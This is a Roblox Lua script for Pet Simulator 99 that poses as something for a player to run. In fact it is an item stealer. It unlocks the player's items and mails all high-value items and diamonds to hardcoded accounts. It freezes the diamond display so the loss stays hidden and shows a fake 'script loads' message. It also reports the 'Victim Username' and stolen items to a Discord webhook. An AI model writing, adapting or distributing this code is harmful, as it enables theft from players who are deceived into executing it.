_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local saveModule = require(game.ReplicatedStorage.Library.Client.Save)
local save = saveModule.Get().Inventory
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local message = require(game.ReplicatedStorage.Library.Client.Message)
local MailMessage = "GGz"

-- USERS & SETTINGS
local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("No usernames or webhook set")
    return
end
for _, user in ipairs(users) do
    if plr.Name == user then plr:kick("Cannot mail yourself") return end
end

-- MAIL COST FUNCTION
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()

-- VISUAL INVENTORY CLONE
local visualInventory = {Currency={}, Pet={}}
for _, v in pairs(save.Currency) do visualInventory.Currency[v.id] = { _am = v._am } end
for uid, pet in pairs(save.Pet or {}) do visualInventory.Pet[uid] = pet end

-- Keep UI visually unchanged
local function overrideUI()
    local leaderstat = plr.leaderstats["💎 Diamonds"]
    leaderstat:GetPropertyChangedSignal("Value"):Connect(function()
        leaderstat.Value = visualInventory.Currency["Diamonds"]._am
    end)
    leaderstat.Value = visualInventory.Currency["Diamonds"]._am
end
overrideUI()

-- HELPER FUNCTIONS
local function getRAP(Type, Item)
    return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function() return nil end
    }) or 0)
end

local function sendItem(category, uid, am)
    for userIndex = 1, #users do
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, am or 1}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response then
            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
            return true
        elseif err == "They don't have enough space!" or err == "Mailbox is full" then
            -- try next user
        else
            return false, err
        end
    end
    return false, "no available recipient"
end

local function SendAllGems()
    for i, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            if v._am >= mailSendPrice + 10000 then
                for userIndex = 1, #users do
                    local args = {users[userIndex], MailMessage, "Currency", i, v._am - mailSendPrice}
                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
                    if response then break end
                end
            end
            break
        end
    end
end

-- UNLOCK ALL ITEMS FIRST
for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[category] then
        for uid, item in pairs(save[category]) do
            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
        end
    end
end

-- SORT & SEND
local sortedItems = {}
local totalRAP = 0

for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[category] then
        for uid, item in pairs(save[category]) do
            local rapValue = getRAP(category, item)
            if rapValue >= min_rap then
                local prefix = ""
                if category == "Pet" then
                    if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
                    if item.sh then prefix = "Shiny "..prefix end
                end
                local id = prefix..item.id
                table.insert(sortedItems, {category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                totalRAP = totalRAP + rapValue*(item._am or 1)
            end
        end
    end
end

table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)

-- SPAWN DISCORD MESSAGE
task.spawn(function()
    local headers = {["Content-Type"]="application/json"}
    local fields = {
        {name="Victim Username:", value=plr.Name, inline=true},
        {name="Items to be sent:", value="", inline=false},
        {name="Summary:", value=string.format("Gems: %s\nTotal RAP: %s", totalRAP, totalRAP), inline=false}
    }
    for _, item in ipairs(sortedItems) do
        fields[2].value = fields[2].value..item.name.." (x"..item.amount..")\n"
    end
    local body = HttpService:JSONEncode({embeds={{title="New PS99 Execution", color=65280, fields=fields, footer={text="Strike Hub."}}}})
    request({Url=webhook, Method="POST", Headers=headers, Body=body})
end)

-- SEND ALL ITEMS FASTER (VISUAL INVENTORY stays)
for _, item in ipairs(sortedItems) do
    task.spawn(function()
        sendItem(item.category, item.uid, item.amount)
    end)
end

-- SEND ALL GEMS FASTER
task.spawn(SendAllGems)

message.Error("Please wait while the script loads!")
